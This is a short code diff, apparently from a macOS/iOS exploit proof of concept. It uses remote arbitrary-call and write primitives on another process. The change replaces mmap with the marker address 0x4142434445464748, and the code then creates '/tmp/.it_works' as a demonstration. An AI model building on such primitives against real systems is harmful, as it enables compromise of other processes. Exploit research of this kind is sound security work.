@@ -81,7 +81,7 @@
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
         //xpc_object_t bootstrap_pipe = ((struct xpc_global_data *)_os_alloc_once_table[OS_ALLOC_ONCE_KEY_LIBXPC].ptr)->xpc_bootstrap_pipe;
         
-        vm_address_t map = RemoteArbCall(mmap, 0, 0x4000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
+        vm_address_t map = RemoteArbCall(0x4142434445464748, 0, 0x4000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
         printf("Mapped memory at 0x%llx\n", map);
         RemoteWriteString(map, "/tmp/.it_works");
         RemoteArbCall(mkdir, map, 0700);
